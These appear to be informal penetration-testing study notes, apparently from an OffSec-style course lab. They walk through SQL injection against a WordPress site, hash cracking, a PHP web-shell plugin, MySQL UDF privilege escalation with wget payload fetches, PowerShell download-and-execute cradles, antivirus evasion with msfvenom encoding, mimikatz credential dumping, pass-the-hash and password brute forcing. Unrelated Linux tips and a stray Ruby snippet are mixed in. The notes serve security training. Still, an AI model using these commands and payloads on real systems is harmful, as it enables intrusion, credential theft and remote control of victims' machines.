	before that send the cookie to the repeater from the history tab 
	u paste the exploit in place of the cookie code 
	result willl be in the sss_param variable in the script tag 
	search for sss_param
	 auto scroll for good
	 see the version of the database 
	 do the exploit was successful and injection worked 
	 
	'MARIA DB '
	
	next step 
	 
	
   
   
  to get a list of tables use 
  
  1,2,3,4,5,6,7,8,9,table_name,11 FROM information _schema.tables#"];
  
  wp_users is critical resources 
  
  1,2,3,4,5,6,7,8,9,column_name,11 FROM information_schema.column WHERE table_name='wp_users'#"];
  
  
  now most important to us is the user login and user pass colum nthat is now revealed 
  
   
   
   next the sql request 
   1,2,3,4,5,6,7,8,9,user_login,11 FROM wp_users#"];
   
   
   now to get the pass  
   hash use this query updated 
   1,2,3,4,5,6,7,8,9,user_pass,11 FROM wp_users#"];
   
   
   this gives you admins password hash 
    
	note that encoding 
	\\\
	for a single forward slash 
	
	
	we need to crack this hash 
	
	lets use jtr rockyou wordlist  
	john the ripper 
	with hash 
	
	  echo passwd hash to pass.txt 
	  and crack using jtr
	  
	  john --path to wordlist  and pass.txt 
	  we got the passwd 
	  
	  
	  now go to wp-admin 
	  http://sandbox.local/wp-admin 
	  
	  succes 
	  
	  
	  
	  enumertaing the admin interface 
	  -----------------------------------
	  lets investigate 
	  Now !
	  
	   check the database host 
	   now we can elevate our access using that 
	   wordpress aspects are written in PHP
	    so php_reverse_shell should work 
		
		sudo apt install seclists 
		then search 
		cd /usr/share/seclists
		cd Web-Shells/WordPress
		ls
		leafpad to check it 
		
	 
	 need to pack payload in the wordpress format wordpress accepts only zip 
	 wp_content/plugin 
	 zip is named plugin-shell.zip 
	 
	 sudo zip plugin-shell.zip plugin-shell.php
	  
	  now install it in the wordpress admin panel
	  
	 curl http://sandbox.local/wp-sontent/plugins/plugin-shell/plugin-shell.php?cmd=whoami
	 command parameter here is cmd as an arg for the plugin-shell.phph
	  now lets create a payload using msfvenom 
	  in the format -f elf 
	  
	  
	  
check the database screenshot 
and then after all run 
system clear 



searchsploit mysql local 
user defined for mysql are custom repeatable functions
to accomplispecifc objectives they are written in c or c++
they can also run system commands
UDF can be used to escalate priveleges among the host 





46249.py  exploit for mysql and local 
 check if the alreday variables in the mariadb and those of the vulnerable variables are common 
 
the binary code of the shellcode should be shared library  that impl exports the  functions we need in the database 


select pick what we need and sort the exploit 

select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec return int soname udf_filename
select * from mysql.func where name='sys_exec' \G
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp.sh; chmod +s /tmp/sh')


this is the exploit baby 
  
  
  
  a promising github page 
  
  https://github.com/mysqludf/lib_mysqludf_sys
  and then lets compile it 
  
  
  lib_mysqludf_sys.c
  
   leverages the system command 
   
   the main function is also name sys_exec as the same as our exploit 
   
    sudo apt get install default-libmysqlclient-dev
	
	
	lets delete the old one 
	rm lib_mysqludf_sys.so
	
	now review the makefile in screenshot 
	gcc -Wall
	-shared floag says it is a shared library 
	  
	  
	   transferring shared library 
	   select binary 0xshellcode into dumpfile @@plugin_dir
	   
	   
	   now lets work on hex dump udin g xxd
	   xxd -p lib_myswludf_sys.so | tr -d '\n' > lib_myswludf_sys.so.hex
	   
	   
	   
	  we will use xclip to copy the content 
	  like this 
	  lib_myswludf_sys.so.hex | xclip -selection clipboard 
	  
	  set some var = 
	  0x to the begining of the hash so it read the hex as binary 
	  like set shell = 0x 'paste the hex we produced '
	  
	  
	  select binary @shell into dumpfile @@plugin_dir
	  
	  says access denied for user  'wp'@'%'
	  
	  
	  psaux on ubuntu  via meterpreter 
	  ps aux 
	  systemctl
	  all apps will be found in ls /usr/bin 
	  
	  
	  
	  netstat -tulpn
	  uname -a 
	  now searchsploit it 
	  
	  
	  find /-name gcc -type f 2>/dev/null
	  upload kernel exploit via meterpreter 
	  mkdir root/.ssh
	  and paste the ssh -keygen 
	  now connect kali with it  wihtout passwd
	  ssh root@sandbox.local
	  and now find credentials
	   /var/log/auth/log file 
	    /etc/passwd
		/etc/group
		/etc/shadow
	 
ls -alh /home/ajla
cat /home/ajla/.bash_history 
cat ~/.bash_history
got the root passwd from the command 


now go to sql client with passwd and get into mariadb 
and run the following commands
 
	  select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec return int soname udf_filename
select * from mysql.func where name='sys_exec' \G
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp.sh; chmod +s /tmp/sh')
	
	
	start python server on port 80 
	now 
	write 
	select sys_exec('wget http://{IP}');
	now check kali python server and notice the connection made 
	so now we can have a reverse shell instead of it
	
	
	on maria db 
	lets download the payload from the server
	by select  sys_exec('wget hhtp://{IP}/shell.elf');
	and run the basic manners
	
	  cat etc/fstab
	  cd /mnt/scripts 
	  netstat -tulpn
	  cat systemreports.ps1

	  proxychain with nmap
	  proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard 
	  proxychains nmap ---top-ports=20 -sT Pn 10.5.5.20
	  netstat -ano
	  
	  lets look at the service in the box 
	  wmic service get name,displayname,pathname,startnode
	  find auto with 
	  | findstr /i "auto"
	  ignore window services by findstr /i /v "c:\windows"
	  ignore using /v
	  
	  
	  an unqouted search path could create a path for elevated permission 
	  
	  windows + R
	  services.msc
	  
	  
	  to know the access of the services 
	  
	  know about icacls 
	  icacls "C:\Puppet"
	  
	  antivirus uses shelter
	  to inject a meterpreter payload
	  into a windows memory 
	  copy the binary 
	  copy the whoami.exe from the windows-resources/binnaries
	  
	  
	  
	  now create a meterpreter
	  for it with common payload 
	  but with -e  command with x86/shikata_ga_nai -i 7 -f raw > net.bin 
	  -e for encode  (x86shikata_ga_nai)
	  -i iterations of 7 here 
	  
	now use shelter to inject itto whiami.exe
	
	
	now download it from the python server from kali linux 
	and then move itto Puppet current.exe
	 
	 meterpreter background
	 
	 to migrate to  a new session on starrt 
	 use  : 
	 set AutoRunScript post/windows/manage/migrate
	 exploit

	 to list tokens lets use mterpreters icognito method 
	 
	 and then 
	 list_tokens -u 
	  
	  find anything at mail.sandbox.local  from profiles/jbv4ndsh.default-release/mail
	  
	 for -L %i in <1,1,255> do @ping -n 1 -w 200 10.5.5.%i > null
	  echo %i
	  
	  
	  FOXYPROXY OPTIONS FOR BURPESUITE
	  ------------------------------------
	  proxychains dirb http://{IP}/ -w 
	  
	  dirb will utilize w argument to extend running after the warning messages tooo 
	  
	  
	  
	  use powershell.exe to download the payload from the python server in kali 
	  here we go 
	  :
	  
	  powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://{IP}/wwhoami.exe', 'c:\Users\Public\whoami.exe')
	  
	  
	  -------------------------------
	  Immunity debugger 
	  
	  F2 
	  F9 
	  F7
	  ctrl + F9
	  
	  
	  
	  the square bracket in bash is equivalent to test command in bash 
	  
	  
	  instead of lessu can use pg 
	  more
	  
	   -w and -t 
	    w for url 
		and t for title
		
		
		cutycapt to convert png to html 
		
		cutycapt --url=$ip --out=$ip.png; done 
		
		
		
		
		Bash_history 
		-------------------
		HistFileSize 
		HistSize 
		history
		use ! with line number to perform history 
		use !! to repeat the command again 
		hold down ctrl and r 
		for search facility
		 >>
		 awk -F ":" '{print $1,$3 }'
		 F for fields 
		 1st and third fields which use :: as separator 
		 
		  cut can accept only on  delimiter 
		  uniq -c 
		  c prints thr prefix that tells the number of occurrences
		  sort -urn 
		  
		  
		  File Editor 
		  ---------------
		  nano and vi 
		    in nano 
			ctrl + O to write changes to the file 
			ctrl  + K to cut the current line 
			ctrl u to uncut the line and paste it at the cursor location 
			ctrl + W to search within the file 
			ctrl  + X to exit 
			
			VI 
			------
			I insert 
			esc to cmd 
			dd delete
			yy to copy 
			p to paste 
			x to delete the current character 
			:w write to disk and be in the terminal vi 
			 
		:Q! to quit wihtout writing the file to the disk 
		:WQ! to quit the file saving 
		
		
		
		file comparison 
		-----------------
		
		comm command   display the lines which are in common and not 
		three column 
		first for the unique items in the first  file 
		second for the unique items in the second  file 
		and third for common items in file 
		
		   suppress columns by using
		the column number along with it 
		like 
		comm -12 scan-a.txt scan-b.txt
		
		Diff command 
		contextual format use -c with it 
		diff -c and two files
		it will show both items as tables unique in the files
		 
		 
		 and for unified format 
		 use -u with diff
		 diff -u 
		 
		  vimdiff
		  window divides to two and differences are visualized 
		  switch windows using ctrl + W and an arrow key 
		  
		  to jump to the next change in the diff 
		  shortcut is ] + C
		  simillarly [ + C for the previous change 
		  D + O press  will get a change in the current window and put it oin the other window 
		  
		  D + P will get a change from the other window to the current window 
		    
			
			
			Backgrounding process
			
			ping -c 
			c is count 
			
			ping -c 400 localhost > ping_results.txt &
			
			
			
			here the we move the command operation to backgroun & usage 
			use & for background process
			JOB 
			
			
			background Job  (&)
			pause it by using ctrl + c as normal 
			and continus it after by  the command 
			BG 
			no but bg 
			
			JOBS AND FG 
			------------------
			  simple jobs command gives you the job running 
			  at the stage 
			  
			  
			  running the fg command with % and the job number lets u transfer the process to foreground 
			  
			  check foreground process by executing fg 
			  
			
			
			Process control and kill 
			  
			  once again & for background run 
			  ps -ef
			  e selects all process 
			  f full format listing 
			  -C search Command with it 
			   kill using th process number 
			   kill command 
			   
			   
			   File and Command Monitoring 
			   ------------------------------
			   tail 
			   and watch 
			   Tail  
			   ------
			   sudo tail -f /var/log/apache2/access.log
			   tail -nx 
			   where x is the number of lines u wat to print 
			   example :
			   tail -n2 /etc/lsb_release 
			   
			   
			   Watch 
			   -------
			   
		  watch -n 5 w
		  w command is used for listing logged in users 
			 and n for supplying second 
			  
			  w  logged on users 
			 
Downloading files 

wget
--------
-O

curl 
-----
-o

axel
-----
  -a for progress
  -n is number of connection 
  -o for the file name downloaded
  
Customizing the bash environment 
----------------------------------
histcontrol - ignoredups for duplicates 
histignore - give command to exclude 
histtimeformat  - time formats


other commands in the strftime man page for time formats 


all CAPS




 alias lsa='ls -la'
 
 run just alias to see the default alias 
 
 
 
 persistent customization 
 -----------------------------
 /etc/bash.bashrc
 edit bashrc 
 in home directory 
 
 
 ls --color=auto
 dir --color=auto
 vdir --color=auto
 
 grep --color=auto
 fgrep --color=auto
 egrep --color=auto 
 
 
 
			 
		   ll = ls -l 
		   la = 'ls -A'
		   l = 'ls -CF'
		   
		   
  	 	   
		   
	

-------------------------------------------------------------------
	Client side Attack 
	--------------------
	 microsoft signed binary mshta.exe 
	  for browsers 
	  
	  
	  
	  
	  --------------------------------------------------
	  use wine to run binary 
	  no ssl verification if we clain verify to be false in requests
	  python code block 
	  curl -k
	  k for system command 
	  
	  
	  
	  sudo apt update && sudo apt -y install pure-ftpd
	  ftp 
	  -s for file text
	  -n suppress automatic logging log credentials prompt 
	  -v to suppress interactive shell
	  
	  
	  use s like 
	  this 
	  s: filename.txt
	 
	 save the filename to ftphome 
	 for the files to be copied 
	 type ftp.txt
	 open 10.11.0.4 21
	 USER offsec
	 lab 
	 bin  // for binary transfer 
	 GET nc.exe
	 bye 
	 
	 run vbs version of wget 
	 using 
	 cscript wget.vbs http://{IP}/wget.exe evil.exe
	 and the same for the powershell using wget.ps1
	 using New-Object System.Net.WebClient
 and WebClient .DownloadFile($url,$file)
 

to ensure both correct and stealthy execution 
use thsi command
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive
-NoProfile -File wget.ps1
 
 
 also using Invoke Expression 
 IEX
 powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://{IP}/helloworld.ps1')
 
 
 windows downloads with exe2hex
 and powershell
	  
	  upx   - executable packer in linux 
	    pe compression tool 
		
		
		exe2 hex to convert to hex 
		  exe2hex -x nc.exe -p nc.cmd 
		  
		  tftp transfer 
		sudo atftpd --daemon --port 69 /tftp
		tftp -i {IP} put evil.exe 
		
		
		
		
		apropos command to search man pages 
		
		find files 
		three commands
		
		locate
		find
		which

		verify ssh is running or not using ss command
		
		sudo ss -antlp | grep sshd 
		verify anything running with ss -antlp 
		with grep
		
		
		
		systemctl list-unit-files 
		 option 
		  apt update 
		  apt upgrade 
		 apt upgrade metasploit-framework 
		 apt-cache search 
		 apt show 
		 apt install
		 apt remove --purge // completely remove tool 
including conf files 
 		 
		 
		 
		 dpkg
		 -------
		 operating offline 
		 no need internet connection 
		 command 
		 
		 if already the deb file is available 
		 
		 sudo dpkg -i ./nano_3.3.2_amd64.deb 
		 i for install
		 
		 
		 
		 
		 
		 CROSSFIRE GAME 
		 ----------------
		 Linux Kernel Exploit 
		 lets open ewins debugger 
		 msf nasm shell utility for advanced usage  by offsec
		 
		 
		 good exploit websites 
		 exploit db by offsec 
		 security focus.com
		 //it is a vulnerability database
				
		packetStorm 
		it also host security tools 
		we can tailor it and it is very usefull 
		
		
		all these websites updates through twitter and RSS Feeds
		
		
		Goodle Search Hacking 
		--------------------------
		search queries
		-----------------
		site:
		inurl:
		intext:
		intitle:
		
		
		
		Offline Exploit Resources 
		--------------------------------
		Searchsploit 
		nmap nse 
		uses like 
		grep Exploits *.nse
		/usr/share/nmap/scripts
		nmap --script-help=clamav-exec.nse
		 
		 
		 Beef 
		 beef-xss
		 Browser Exploitation 
		  
		  
		  
		  
		  give --reason for nmap reason protocol messages 
		  Metasploit framework 
		  -------------------------
		  db_nmap for nmap in msfconsole 
		  msfconsole -q 
		  for terminal 
		  use auxiliary/scanner/portscan/tcp to scan target with RHOST
		  hosts
		  services -p 445
		  workspace 
		  workspace -a test 
		  for a workspace test 
		  to get into workspace : workspace test
		  workspace d test to delete a workspace
		  show auxiliary 
		  search -h 
		  //use search in order to fin d the auxiliary modules (filter)
		  
		  search type:auxiliary name:smb
		    once u find it use it with use command 
			then for info 
			info command 
			inside the auxiliary directory 
			show options
			find services and copy to rhosts 
			like:
			services -p 445 --rhosts
			now luanch it with 
			run or exploit 
			
			to globally set rhosts value 
			use setg 
			like setg RHOSTS 10.11.0.22
			 
			 run 
			  search syncbreeze
			 info sxploit/windows/http/syncbreeze_bof
			 show payloads
			 show payloads windows/shell_reverse_tcp
			 show options 
			 check command 
			   
			ipconfig 
			
			staged vs non staged payloads
			---------------------------------
			
			staged  payloads 
			it is divided into two stages 
			1st stages gives the small primary payload
			posses the victim machine to get the shell to the attacker
			and transfer a larger
			secondary contain a rest payload
			   and then execute it 
			   
			   stage are preferred 
			    if the  vulnerability we are exploiting doesnt have any buffer 
then we will use staged payloads
		since first part is smaller than a full natural payload 
		it hel pin situatioon where space is limited 
	

windows/shell_reverse_tcp ==> unstaged 
windows/shell/reverse_tcp ==> staged
these are both payloads
	staged increases the chances 
	after first is executed then the second one is injected into the memory 
	
	
	search meterpreter
	search meterpreter type:payload
	help
	
	
	on the shell 
	meterpreter commands
	
	sysinfo 
	getuid 
	upload  //must use two backslashes for destination due to shell escaping
	download //must use two backslashes for destination due to shell escaping
	pwd
	cd
	ls
	shell
	//its persistent 
	
	execute -f notepad
	ps
	kill $processid
	
	
	VNC INJECTION Payload 
	it is used for creating a vnc graphical connection 
	or reverse php
	that can be used to exploit a php web Application 
	 
	 
	 varius file  formats 
	 asp
	 vbs
	 jar
	 war
	 dll
	 exer
	 
	 
	 -e encode 
	 -i for encoding iterations
	 pe injection using 
	 -x /usr/share/windpw-resources/binaries/plink.exe
	 to embed shellcode with exe 
	 
	 u can also use generate command inside msf console 
	 for pe injection encoding 
	 
	 exploit -j 
	 jobs
//	 to see any session running in background 
	 
	 jobs -i 0 
	 msfvenom -l formats 
	 
	 hta-psh 
	 vba 
	 vba-psh 
	 are designed to be used in Client side Attacks 
	 
	 show advanced command 
	 
	 in exploit 
	 use multi/handler
	 in that
	  set EnableStageEncoding true
	  set StageEncoder x86/shikata_ga_nai
	  
	  
	  
	  auto enumerate logged on users 
	  ---------------------------------------
	  run and xploit fiirst 
	  after logged on 
	  background 
	  to return to meterpreter sessions 
	  sessions -l 
	  sessions -i 
	   // tp give id and enter to shells for compromised shells 
	   like sessions -i 4
	   
	   
	   unset AutoRunScript
	   unset EnableStagingEncoding
	   clear 
	   
	   
	   currently available transport 
	   using 
	   transport list 
	   transport add -t reverse_tcp -l 10.11.4.0 -p 5555 
	   -l ==>localhost ip address
	   -t == > type of transport
	   -p ==> localport 
	   
	   
	   transport next
	   we use to transport to create a new meterpreter shell session and shut down the old one 
	   
	   exit -y
	   
	   
	 
	 u,e,s,n

Interprets the regexp as Unicode (UTF-8), EUC, SJIS, or ASCII. If none of these modifiers is specified, the regular expression is assumed to use the source encoding.

class MyServer < SOAP::RPC::StandaloneServer
   ...............

   # Handler methods
   def add(a, b)
      return a + b
   end
   def div(a, b) 
      return a / b 
   end
end



post exploitation  metasploit 
-----------------------------------
screenshot 
keyscan_start 
keyscan_dump
keyscan_stop
migrate to a different process id 
using 
migrate proc_id


load powershell
help powershell
powershell_execute "$PSVersionTable.PSVersion"
load kiwi // for mimikatz 
get system 
creds_msv
route add {internet subnet ip } 2 
2 is the session id for the root 
 now use auxiliary  tcp portscan 
 and after use psexec from smb module exploit 
 
 if we know domain controller
 use exploit/windows/smb/psexec
 set SMBDomain corp
 set SMBUser jeff_admin 
 set SMBPass Qwerty09!
 set RHOSTS 192.168.1.110
 set payload windows/meterpreter/bind_tcp
 set LPORT 4444
 exploit
 background 
 clear 
 use multi/manage/autoroute
 for automatically adding route 
 show options 
 sessions -l
 set SESSION 2
 exploit
 clear 
 use auxiliary/server/sock4a
 show options 
 set SRVHOST 127.0.0.1
 //SRVHOST
 exploit -j 
 clear 
 sessions -i 2
 portfwd -h 
 portfwd add -l 3389 -p 3389 -r 192.168.1.110
 -r ==>remote 
 -l ==> localhost port 
 -p ==> port on remote computer 
 rdesktop 127.0.0.1
 exit -y 
 clear 
 
 
 
 on normal terminal 
 -----------------
 sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'
 sudo proxychains rdesktop 192.168.1.110
 now update the credentials 
 logged in 
 after the rdesktop is finished 
 
 clear 
 now we need to update proxychains 
 proxychains.conf 
 
 
 
windows/meterpreter/reverse_tcp
java/meterpreter/reverse_tcp
php/meterpreter/reverse_tcp
php/meterpreter_reverse_tcp
ruby/shell_reverse_tcp
cmd/unix/interact
cmd/unix/reverse
cmd/unix/reverse_perl
cmd/unix/reverse_netcat_gaping
windows/meterpreter/reverse_nonx_tcp
windows/meterpreter/reverse_ord_tcp
windows/shell/reverse_tcp
generic/shell_reverse_tcp


sbd, or Secure Back Door, is another tool that is used to generate shells with strong encryption (AES-CBC-128 & HMAC-SHA1). It uses a similar syntax as Ncat, except it doesn’t use SSL/TLS, and therefore don’t have the --ssl option to specify an encrypted shell. Instead, the option to enable encryption is -c on, which is on by default, so it does not need to be specified.
Something to note is the fact that when Netcat or Ncat tries to connect to an sbd listener, authentication fails and it gets no response when commands are sent. Same goes for when there is a Ncat SSL listener and Netcat or Ncat attempts to gain a bind shell. Specifying the --ssl option also causes a Connection Refused error.

sbd -nlvp 999 -e /bin/bash 
sbd -nv  192.168.56.102 9999
also can use ncat -nv 192.168.56.102 9999 




Metasploit Automation 
---------------------------
 if you echo everything into bash rc file 
 like setup.rc
 
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_https
 set LHOST 10.11.0.4
 set LPORT 443
 set EnableStageEncoding true 
 set StageEncoder x86/shikata_ga_nai
 set AutoRunScript post/window/manage/migrate 
 set ExitOnSession false
 exploit -j -z 
 
 -z flag to stop automatically interact with the user terminal 
 
 
 now run it with msfconsole 
 sudo msfconsole -r setup.rc
 now run the shellcode in the target system 
 clear
 
 Dictionary Attacks 
 -----------------------
 
 cewl help | less
 cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
 -m ==> is for length of the words 
 -w ==> write to the file 
 
  sudo nano /etc/john /jonh.conf 
  search for [List.Rules:Wordlist]
   $ in the conf file says to append the number to the original word
   we need to append two digits to the words in the wordlist by 
   using the statement 
   $[0-9]$[0-9]
   now mutate the wordlists 
   by 
   john --wordlist=megacorp-cewl.txt --rules 
   --stdout > mutated.txt
   
     ------------------------------------
	 frame a wordlists
	for crunch 
----------------------------
		@ ==> lower case alpha characters 
		' ==> upper case alpha character
		% ==> number characters 
		^ ==> special characters including space 
		
		crunch min max -t  ,@@^^%%%
		-t for pattern 
		
		crunch 4 6 0123456789ABCDEF -o crunch.txt 
		
 clear
 
 wc -l  crunch.txt 
 
 we can generate passwd based on predefined characters
   /usr.share/crunch/ charset.lst 
   
   crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
   
   
   -----------------------------------------------------------------
   hydra
   medusa 
   crowbar  
   spray 
   ------------------------------------------------------------------
   htaccess attack with medusa 
   ----------------------------
    lets use rockyou wordlists 
	 gunzip rockyou.gz
	 medusa -h {IP} -u admin -P /usr/share/wordlists/rockyou.txt
	 -M HTTP  -m DIR:/admin 
	  
	  medusa -d 
	  for options 
	  
	  
	  Remote Desktop Protocol Attack with crowbar 
	  ----------------------------------------------
	  Network authentication cracking tool 
	  crowbar -b rdp -s {IP} -u admin -C ~/password-file.txt -n 1
-b protocol 
-u username 
-C passwd file 
-n no of threads 

		RDP does not handle multiple threads it only handle a single thread 
		
		
		
		SSH Attack with THC-Hydra 
		-----------------------------
		under active development 
		SSH and Http
		 
		 -l username 
		 -P wordlist 
		 protocol://IP  to specify target protocol and ip address
		 
		 
		 hydra -l kali -P ~/password-file.txt ssh://127.0.0.1
		 
		 
		 HTTP POST Attack with THC Hydra 
		 ----------------------------------
		 hydra http-form-post -U | less
		 
		 -U for the additional info 
		 for the app discovery  it list the parameter 
		 
		 hydra  10.11.0.22 http-form-post 
		 "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin 
		 -P /usr/share/wordlists/rockyou.txt
		 -vV -f
		 
		 
		 vv for verbose 
		 and f is to stop 
		 
		  
		  leveraging passwd Hashes 
		  ---------------------------
		  Retrieving passwd hashes 
		  ---------------------------
		  locally stored passwd
		  ----------------------------
		  
		  
		  consider ;
		  the length of the hash 
		  the charset used in the hash 
		    and any special char used by hash 
			
			
			Hashid tool 
			-------------
			hashid command can give u the dteail abt the hash 
			hashid {hash}
			
			  userid:passwd hash 
			  is the format stored in /etc/shadow 
			  sudo grep root /etc/shadow 
			  salt is random 
			  this prevent hash lookup attacks 
			  
			  
			  in windows 
			  hashed passwd are stored in SAM 
			  secure Accounts manager 
			   syskey feature encryption 
windows and nt based os 
two different 
hashes 
			   
NTLM - md4 hashing 
LM  -  	based on desh 
		
		
		lm hash is weak 
		split into two string 
		and they are hashed separately 
		pieces
		each passwd string is converted to uppercase before being hashed 
		they dont include salts 
		 lookup attack is feasible 
		 
		 
		 LM is now disabled 
		 now NTLM Time
--------------------------------------
they supports unicode 
		 they dont split hashes 
		 
		 they are case insensitive 
		 but ntlm hashes stored in SAM database are still not salted 
		 
		 on running sam database cannot be copied 
		 windows kernel keeps an exclusive file system lock on it
		 
		 however we can use mimkatz 
		 mount in memory attacks 
		 ddesigned to dump in same hashes 
		 
		 mimikatz facilitate passwd hash extraction 
		 lsass passwd memory where they are cached 
		 
		 lsass is a privileged process
		 mimkatz.exe
		 privilege::debug 
		 token::elevate 
		 if from a system shell then this step is not required 
		 cls
		 lsadump:sam 
		 
		 the hashes are dumped 
		 
		 
		 also 
		 lsadump::lsa /inject /name:krbtgt
		 
		 passing the hash in windows 
		 ----------------------------
		   
		   ntllm and lm hashes are not salted 
		   they are static 
		   
		 system privileges dump local lm and ntlm hashes 
		 can use it instead of a passwd
		 
		 
		 use pthwin.exe for passing the hash 
		 which performs authentication using smb protocol 
		 
		 
		 
		 pth-winexe -U offsec%{HASH} //10.11.0.22 cmd 
		 
		 user and passwd separated by a % sign 
		 
		 //10.11.0.22 cmd  ==> smb share in unc format 
		 
		  we now have a shell
		  ipconfig 
		  the ntlm hash format we provided changed inot net-ntlm hash 
		  during auth 
		  can capture this by man in the middle attack 
		  either crack them or relay them 
		  clear 
		   
		   
		   Password Cracking 
		   --------------------
		 
		 john hash.txt --format=NT 
		 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT 
		 
		 
		 Linux passwd hashes 
		 -------------------------
		 sudo adduser victim 
		 clear
		 grep victim /etc/passwd > passwd-file.txt
		   same for shadow-file 
		   and mere them 
		  cat passwd-file.txt >> shadow-file.txt
		   john the ripper require a special format of hash 
		   for that reason lets use 
		   unshadow
		   they need unshadow format hash 
		   for john the ripper
		   unshadow passwd-file.txt  shadow-file.txt > unshadowed.txt
		   john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
		   
		   unshadow command 
		   
		 we crack the passwd 
		 
		 newer version jtr arew multithreaded 
		 in older version it can be applied using --fork command 
		 
		 
		 we can also share the cracking load with multiple computer using --node option 
		 sudo deluser victim 
		 
		 
		  
		 gpu cracking  tools are hashcat 
--------------------------------------
		 
		 
		 Powershell Empire 
		 ----------------------
		 
		  targetted primarily  at  active directory environments
		  git clone powershell empire 
		   cd Empire 
		   sudo ./setup/install.sh 
		   sudo ./empire 
		   help
		   
		   
		   Listeners and stagers
		   -----------------------
		   listeners
		   a space and two tabs  for tab completion 
		   
		   uselistener 
		    press tabs two times to know what are available options 
			
			uselisteners http
			    info
				set Host  10.11.0.4
				DefaultDelay  //sets wait interval  callback time 
				Defaultjitter // random offset to default delay 
				  to make the traffic seem less programmatically generated 
				  
				  killDate  terminates the listsner on a date 
				   // for a cleanup 
				   execute 
				    
					
					back command for main listsner menu 
					back 
					  
					  list stagers using 
					  usestager and two tabs 
					   everything including usb rubberdocky 
					   
					   usestager window/launcher_bat 
					   info
					   set the listenet to the one we just created using uselistener 
					   
					   set Listener http
					   execute 
					   
					   less /tmp/launcher.bat 
					   base64 encoded 
		   
		 the empire agent 
		 ------------------
		 agent is the final payload 
		 in which we execute our command 
		 while listener is running 
		 
		 
		 aes encrypted communication channel using powershell empire 
		 and that is agent 
		 
		 
		 everything similar like metasploit 
		  execute launcher in windows will recieve 
		  first agent call
		to display all agents 
		
		agents 
		
		interact {agent_name }
		sysinfo 
		help
		ps
		psinject http 252
		//psinject {listener name} <ps id>
		
		unlike migrate command in metasploit 
		new agent is created with that ps id 
		
		 
		 powershell modules 
		 
		------------------------
		usemodule //double tab
	     
		 info 
		 to avoid leaving behind traces
		 opsecsafe true 
		 minlanguageversion for min powershell versions 
		 background to hide 
		 outputExtension  for the output format  if  the payload outputs anyfile 
		 needs admin to false if we dont need admin in this module 
		 
		 execute 
		  
	  
	  Credential and privilege escalations
	  ----------------------------------------
	  usemodule powershell/privesc/powerup/
	  execute 
	  
	  bypass uac helper module 
	  
	  usemodule powershell/privesc/bypassuac_fodhelper
	  info
	  set Listener http 
	  execute 
	  interact agent 
	  usemodule  credentials/

mimikatz can be used here by psinjection 
dllinjection 
  using usemodule credentials 
    
	
	 usemodule credentials/mimikatz/logonpasswords
	 execute 
	 
	 creds 
	 
	 creds add  corp.com jeff_admin Qwerty09!
	 usemodule powershell/lateral_movement/invoke_smbex
	 set ComputerName win10-x86
	 set Listener http 
	 set Username jeff_admin 
	 set Hash {Hash }
	 set Domain corp.com 
	 execute 
	 
	 
	 agents 
	 interact {agents id }
	 
	 
	 ---------------------------------------------
	 passive information  gathering
	 
	 whois 
	 als reverse lookup 
	 
	 google hacking 
	 -------------------
	 Operators
	 ------------
	 site:
	 filetype:
	 exclude:
	 intitle:
	 
	 
	 http://www.exploitdb.com/google-hacking-database
	   
	   
	   NetCraft
-------------------------------
dns search page from netcraft
---------------------------------
search site reports 
------------------------------------




recon-ng 
-----------
marketplace search github.com 


https://github.com/lanmaster53/recon-ng-marketplace/wiki/API-keys 

 marketplace info recon/domains-hosts/google_site_web 
 
 marketplace install recon/domains-hosts/google_site_web
 
 modules load recon/domains-hosts/google_site_web 
 info
 
 options set SOURCE megacorpone.com 
  run 
  
  
  back
  show hosts 
  
  marketplace  info recon/hosts-hosts/resolve 
  marketplace install recon/hosts-hosts/resolve 
  modules load recon/hosts-hosts/resolve 
  info
  run 
  //keeping it default  - SOURCE 
  
  show hosts 
  
  
  
  
  Open source Code 
  ------------------
   
  filename:users
  
  michenriks/gitrobs 
  zricethezav/gitleaks 
  
  for seraching github.com 
  
  
  Shodan 
  ------------
  hostname:megacorpone.com 
  
  
  
  Security Headers Scanner
  ---------------------------
  https:securityheaders.com 
  
  SSL Server Test 
  ----------------
  from ssllabs 
  hearbleed 
  hoodle 
  
pastebin 
--------------
  search 
  pastebin 
  
  User information Gathering
  ---------------------------
  Email Harvesting
  ------------------
  theharvester -d megacorpone -b google 
  
  now crack the passwd 
  in cred stuffing
  
  
  
  Social Media Tools 
  ----------------------
  Social Searcher 
  Site Specific tools 
  ----------------------------
  https://digi.ninja/projects/twofi.php
  
  for twitter accounts 
  
     
  
 https://github.com/initstring/linkedin2username
 
 Stack Overflow 
 -------------------
 Information Gathering tools 
 
 OSINT Framework 
 ------------------
 
 Maltego 
 -------------
 Data mining tool 
 n  number of search tools and strategies 
 --------------
 
 https://www.paterva.com
 
 
 
	Port forwarding 
	-------------------
	ping -c 4 google.com 
	
	 nc nvv {IP} 80
	 
	 ssh 
	 
	 transfer twice 
	 
	 port forwarding tool 
	 ----------------------
	 rinetd 
	 install irnetd
	 using apt 
	 
	 cat /etc/irnetd.conf 
	 
	 four parameters 
	 -------------------
	 bind addresses
	 bind port 
	 connect addr
	 connect port 
	 
	edit conf 
	add the port forwarding rule in irnetd.conf 
	
	0.0.0.0 80 216.58.207.142 80
	
	 sudo service irnetd restart 
	 
	nc -nvv 10.11.0.4 80 
	
	
	SSH tunelling 
	---------------------
	 ability to create encrypted tunnels 
	 
	 SSH Local port forwarding 
	 --------------------------
	 ip a
	 
	 
	 check for 
	 sudo cat /root/port_forwarding_and_tunnelling/ssh_local_port_forwarding.sh 
	 
	 and check the IPTABLES issued 
	 
	 -L for port forwarding in ssh command 
	 -l for local Socket 
	: remote socket 
	
	
